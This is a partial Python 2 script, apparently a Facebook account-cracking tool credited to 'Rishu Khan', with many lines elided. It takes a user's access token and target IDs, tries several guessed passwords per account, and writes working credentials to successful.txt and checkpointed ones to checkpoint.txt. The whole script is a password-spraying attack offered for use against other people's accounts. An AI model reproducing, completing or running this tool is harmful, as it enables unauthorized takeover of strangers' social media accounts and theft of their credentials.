...
while loop == 'true':
    print logo
    print '\x1b[1;91m               FIRST STEP LOGIN'
    print '\x1b[1;92m'
    print '\x1b[1;92m '
    username = raw_input('              \x1b[1;91mTOOL USERNAME: ')
...
def reg():
    ...
    print ''
    print ''
    print '\x1b[1;90m  [Connected With Rishu Servers]'
    print ''
...
def reg2():
    ...
    print ''
    print '\x1b[1;96m '
    print ' \xe2\x80\xa2 THIS TOOL IS COMPLETELY CODED BY RISHU KHAN \xe2\x80\xa2 '
    time.sleep(5)
    login()
...
def login():
    ...
    try:
        ...
        print logo
        print ''
        print '\t      [ \033[1;92mLogin With token ]'
        print ''
        print '\033[1;90mPaste token here '
        token = raw_input(':')
...
def menu():
    ...
    print ''
    print '----------------------------------'
    print ' \033[1;91m[1] \033[1;92mSTART'
    print ' \033[1;91m[2] \033[1;92mFOLLOW ALEX ON FB '
    print ' \033[1;91m[3] \033[1;92mCONTACT WITH OWNER '
    print '-----------------------------------'
    print ''
    menu_option()
...
def menu_option():
    ...
    if select == '1':
        ...
        print ''
        print '\033[1;91m\tSelect valid option'
        print ''
        menu_option()
...
def crack_select():
    ...
    if select == '1':
        ...
        print ''
        print ''
        print '\x1b[1;92m \xe2\x8b\x89\xe2\x94\x81\xe2\x94\x81\xe3\x80\x90ENTER YOUR DIGITS\xe3\x80\x91\xe2\x94\x81\xe2\x94\x81\xe2\x8b\x8a'
        print ''
        print '    \x1b[1;97m     \xe2\x97\xa4\xe2\x94\x80\xe3\x80\x90 example : 123 1234 12345 786 \xe3\x80\x91\xe2\x94\x80\xe2\x97\xa5'
        print '\x1b[1;97m'
        print ''
        ...
        try:
            ...
            print '\033[1;91m\tInvalid link OR token'
            print ''
        ...
        try:
            ...
            print '\033[1;91m\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            crack()
    ...
    print ' \033[1;91mThe Process has started'
    print ''
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[RISHU-OK]     \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('successful.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;91m[RISHU-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[RISHU-OK]     \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('successful.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;91m[RISHU-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[RISHU-OK]     \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('successful.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;91m[RISHU-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[RISHU-OK]     \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('successful.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;91m[RISHU-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    print 47 * '-'
    print ''
    print '\033[1;97m The process has completed'
